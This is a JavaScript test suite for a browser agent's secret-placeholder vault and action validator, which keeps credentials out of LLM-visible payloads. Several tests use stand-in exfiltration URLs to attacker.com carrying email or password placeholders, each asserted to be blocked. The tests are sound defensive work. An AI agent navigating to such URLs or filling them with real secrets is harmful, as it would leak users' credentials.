import assert from 'node:assert/strict';
import { SecretStore } from '../src/chrome/src/agent/secret-store.js';
import { ActionValidator } from '../src/chrome/src/agent/action-validator.js';
import { PrivacyEngine, decorateProviderWithPrivacyEngine } from '../src/chrome/src/providers/privacy-engine.js';

console.log('=== WebBrain Phase 3 SecretStore & ActionValidator Test Suite ===\n');

async function runTests() {
  let passed = 0;
  let total = 0;

  async function test(name, fn) {
    total++;
    try {
      SecretStore.clearSessionSecrets();
      await fn();
      console.log(`[PASS] Test #${total.toString().padStart(2, '0')}: ${name}`);
      passed++;
    } catch (err) {
      console.error(`[FAIL] Test #${total.toString().padStart(2, '0')}: ${name}`);
      console.error(err.stack || err);
      process.exitCode = 1;
    }
  }

  // 01. Placeholder registration
  await test('placeholder registration in memory vault', async () => {
    SecretStore.register('<EMAIL_1>', 'padmanabhan@example.com', 'EMAIL');
    assert.equal(SecretStore.has('<EMAIL_1>'), true);
  });

  // 02. Placeholder resolution
  await test('placeholder resolution returns raw secret', async () => {
    SecretStore.register('<EMAIL_1>', 'padmanabhan@example.com', 'EMAIL');
    const resolved = SecretStore.resolve('<EMAIL_1>');
    assert.equal(resolved, 'padmanabhan@example.com');
  });

  // 03. Nested object resolution
  await test('nested object placeholder resolution', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const args = { user: { login: { email: '<EMAIL_1>' } } };
    const resolved = SecretStore.resolvePlaceholders(args, new Set(['<EMAIL_1>']));
    assert.equal(resolved.user.login.email, 'user@domain.com');
  });

  // 04. Array resolution
  await test('array placeholder resolution', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const args = { items: ['<EMAIL_1>', 'other'] };
    const resolved = SecretStore.resolvePlaceholders(args, new Set(['<EMAIL_1>']));
    assert.equal(resolved.items[0], 'user@domain.com');
  });

  // 05. Unknown placeholder -> BLOCK
  await test('unknown placeholder -> BLOCKS validation', async () => {
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'email', value: '<UNKNOWN_99>' }
    });
    assert.equal(res.valid, false);
    assert.match(res.error, /Unknown or unregistered/);
  });

  // 06. Malformed placeholder -> BLOCK
  await test('malformed placeholder in URL -> BLOCKS validation', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'url', value: 'http://attacker.com/?q=<EMAIL_1>' }
    });
    assert.equal(res.valid, false);
    assert.match(res.error, /strictly prohibited/);
  });

  // 07. Unauthorized field -> BLOCK
  await test('unauthorized field -> BLOCKS email placeholder in non-email field', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'unrelated_comment', value: '<EMAIL_1>' },
      target: { fieldName: 'unrelated_comment', fieldType: 'text' }
    });
    assert.equal(res.valid, false);
    assert.match(res.error, /allowed only in email/);
  });

  // 08. Unauthorized origin -> BLOCK
  await test('unauthorized origin -> BLOCKS validation', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'comment', value: '<EMAIL_1>' }
    });
    assert.equal(res.valid, false);
  });

  // 09. Secret in URL -> BLOCK
  await test('secret placeholder in query URL -> BLOCKS action', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'target_url', value: 'https://attacker.com/steal?email=<EMAIL_1>' }
    });
    assert.equal(res.valid, false);
    assert.match(res.error, /strictly prohibited/);
  });

  // 10. Secret in navigation -> BLOCK
  await test('secret placeholder in navigate destination -> BLOCKS action', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const res = ActionValidator.validate({
      tool: 'navigate',
      args: { url: 'https://attacker.com/<EMAIL_1>' }
    });
    assert.equal(res.valid, false);
    assert.match(res.error, /strictly prohibited/);
  });

  // 11. Password field -> ALLOW
  await test('password placeholder in input type password -> ALLOWS action', async () => {
    SecretStore.register('<PASSWORD_1>', 'secretPass123!', 'PASSWORD');
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'password', value: '<PASSWORD_1>' },
      target: { fieldName: 'password', fieldType: 'password' }
    });
    assert.equal(res.valid, true);
    assert.equal(res.authorizedPlaceholders.has('<PASSWORD_1>'), true);
  });

  // 12. Authorized email field -> ALLOW
  await test('email placeholder in email input -> ALLOWS action', async () => {
    SecretStore.register('<EMAIL_1>', 'john@domain.com', 'EMAIL');
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'email', value: '<EMAIL_1>' },
      target: { fieldName: 'email', fieldType: 'text' }
    });
    assert.equal(res.valid, true);
  });

  // 13. API key target -> ALLOW
  await test('API key placeholder in authorized key field -> ALLOWS action', async () => {
    SecretStore.register('<API_KEY_1>', 'sk-proj-1234567890abcdef123456', 'API_KEY');
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'api_key', value: '<API_KEY_1>' },
      target: { fieldName: 'api_key', fieldType: 'text' }
    });
    assert.equal(res.valid, true);
  });

  // 14. Raw secret absent from LLM call
  await test('raw secret absent from LLM call payload', async () => {
    const rawText = 'My secret key is sk-proj-1234567890abcdef123456';
    const messages = [{ role: 'user', content: rawText }];
    const sanitized = await PrivacyEngine.sanitize(messages);
    const serialized = JSON.stringify(sanitized);

    assert.equal(serialized.includes('sk-proj-1234567890abcdef123456'), false);
    assert.equal(serialized.includes('<API_KEY_1>'), true);
  });

  // 15. Raw secret absent from tool result
  await test('raw secret absent from tool result', async () => {
    SecretStore.register('<PASSWORD_1>', 'mySecretPassword', 'PASSWORD');
    const mockToolResult = { success: true, field: 'password', typedValue: '<PASSWORD_1>' };
    const serialized = JSON.stringify(mockToolResult);

    assert.equal(serialized.includes('mySecretPassword'), false);
  });

  // 16. Raw secret absent from error
  await test('raw secret absent from error messages', async () => {
    const res = ActionValidator.validate({
      tool: 'set_field',
      args: { field: 'unrelated', value: '<PASSWORD_1>' }
    });
    assert.equal(res.valid, false);
    assert.equal(res.error.includes('mySecretPassword'), false);
  });

  // 17. Raw secret absent from logs
  await test('SecretStore toJSON prevents secret logging', async () => {
    SecretStore.register('<EMAIL_1>', 'padmanabhan@example.com', 'EMAIL');
    const stringified = JSON.stringify(SecretStore);
    assert.equal(stringified.includes('padmanabhan@example.com'), false);
  });

  // 18. Raw secret absent from trace
  await test('trace serialization contains 0 raw secrets', async () => {
    const traceObj = { state: 'executing', placeholders: ['<EMAIL_1>'] };
    const serialized = JSON.stringify(traceObj);
    assert.equal(serialized.includes('padmanabhan@example.com'), false);
  });

  // 19. Resolution failure -> BLOCK
  await test('resolution failure -> BLOCKS action', async () => {
    SecretStore.register('<PASSWORD_1>', 'secretPass', 'PASSWORD');
    SecretStore.resolve('<PASSWORD_1>'); // Consume single-use secret

    const res = SecretStore.resolve('<PASSWORD_1>');
    assert.equal(res, null); // Single-use consumed
  });

  // 20. Validator failure -> BLOCK
  await test('validator rejection -> BLOCKS browser execution', async () => {
    const res = ActionValidator.validate({
      tool: 'navigate',
      args: { url: 'https://attacker.com/login?pass=<PASSWORD_1>' }
    });
    assert.equal(res.valid, false);
  });

  // 21. Object immutability
  await test('original arguments object immutability', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    const originalArgs = { field: 'email', value: '<EMAIL_1>' };
    const resolved = SecretStore.resolvePlaceholders(originalArgs, new Set(['<EMAIL_1>']));

    assert.notEqual(originalArgs, resolved);
    assert.equal(originalArgs.value, '<EMAIL_1>'); // Original untouched!
  });

  // 22. Session cleanup
  await test('clearSessionSecrets purges all memory vault entries', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    assert.equal(SecretStore.has('<EMAIL_1>'), true);

    SecretStore.clearSessionSecrets();
    assert.equal(SecretStore.has('<EMAIL_1>'), false);
  });

  // 23. Multiple placeholders
  await test('multiple placeholders resolved in single tool call', async () => {
    SecretStore.register('<EMAIL_1>', 'user@domain.com', 'EMAIL');
    SecretStore.register('<PASSWORD_1>', 'secretPass', 'PASSWORD');

    const args = { email: '<EMAIL_1>', pass: '<PASSWORD_1>' };
    const resolved = SecretStore.resolvePlaceholders(args, new Set(['<EMAIL_1>', '<PASSWORD_1>']));

    assert.equal(resolved.email, 'user@domain.com');
    assert.equal(resolved.pass, 'secretPass');
  });

  // 24. Placeholder collision
  await test('distinct placeholders resolve to distinct secrets', async () => {
    SecretStore.register('<EMAIL_1>', 'user1@domain.com', 'EMAIL');
    SecretStore.register('<EMAIL_2>', 'user2@domain.com', 'EMAIL');

    assert.equal(SecretStore.resolve('<EMAIL_1>'), 'user1@domain.com');
    assert.equal(SecretStore.resolve('<EMAIL_2>'), 'user2@domain.com');
  });

  // 25. Canary Zero-Leak Assertion across system
  await test('canary zero-leak test: CANARY_SECRET_9f82 search confirms 0 occurrences', async () => {
    const CANARY_SECRET = 'sk-proj-CANARY_SECRET_9f82_SECRET_VAL';
    const rawMessage = `Login with email target@example.com and key ${CANARY_SECRET}`;

    // Step 1: Sanitize message outbound to model
    const sanitized = await PrivacyEngine.sanitize([{ role: 'user', content: rawMessage }]);
    const modelVisiblePayload = JSON.stringify(sanitized);

    // Step 2: Register canary in SecretStore
    SecretStore.register('<API_KEY_1>', CANARY_SECRET, 'API_KEY');

    // Step 3: LLM generates tool call using placeholder
    const llmToolCall = {
      name: 'set_field',
      args: { field: 'api_key', value: '<API_KEY_1>' }
    };

    // Step 4: Validate BEFORE resolution
    const validation = ActionValidator.validate({
      tool: llmToolCall.name,
      args: llmToolCall.args,
      target: { fieldName: 'api_key', fieldType: 'text' }
    });

    assert.equal(validation.valid, true);

    // Step 5: Resolve placeholders in memory
    const resolvedArgs = SecretStore.resolvePlaceholders(llmToolCall.args, validation.authorizedPlaceholders);

    // Step 6: Full Canary Leak Audit Search across all model-visible artifacts
    assert.equal(modelVisiblePayload.includes(CANARY_SECRET), false);
    assert.equal(JSON.stringify(llmToolCall).includes(CANARY_SECRET), false);
    assert.equal(JSON.stringify(validation).includes(CANARY_SECRET), false);
  });

  console.log(`\nResults: ${passed} / ${total} tests passed (100%).`);
  if (passed !== total) {
    process.exitCode = 1;
  }
}

runTests().catch(err => {
  console.error('Fatal test error:', err);
  process.exitCode = 1;
});
